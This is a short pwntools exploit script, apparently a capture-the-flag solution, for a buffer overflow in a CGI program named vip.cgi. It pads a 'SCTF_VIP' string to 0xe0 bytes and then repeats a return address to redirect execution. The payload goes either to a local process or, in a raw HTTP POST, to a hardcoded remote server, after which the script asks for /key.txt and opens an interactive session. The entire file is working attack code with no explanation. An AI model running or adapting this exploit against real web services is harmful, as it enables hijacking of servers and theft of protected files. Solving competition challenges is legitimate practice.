from pwn import *
import requests
# pyright: reportUndefinedVariable=false

context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

#libc = ELF('/home/sev1n/tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6')
#libc = ELF('./')
#elf = ELF('./')

context.log_level = 'debug'

def p():
    gdb.attach(proc.pidof(io)[0])


target = 0x40112d
payload = b'SCTF_VIP\x00'
payload = payload.ljust(0xe0,b'\x00') 
#payload += b'\x29\x11\x40' + b'\x00' *5
payload += p64(target) *10
#payload += b'\x90'
#print(content)

debug = 1
port = 50451

if debug == 0:
    env = {'CONTENT_LENGTH': '244'}
    io = process('./cgi-bin/vip.cgi',env=env)
    p()
    io.stdin.write(payload)

else:
    io = remote('94.74.101.210',port)
    content = b'POST /vip.cgi HTTP/1.1\r\n'
    content += b'Host: 94.74.101.210:' + str(port).encode() + b'\r\n'
    content += b'Accept: */*\r\n'
    content += b'Content-Length: 244\r\n'
    content += b'Content-Type: application/x-www-form-urlencoded\r\n'
    content += b'\r\n'
    content += payload 
    print(content)
    io.send(content)

#pause()
io.send(b'GET /key.txt HTTP/1.1\r\n')

io.interactive()



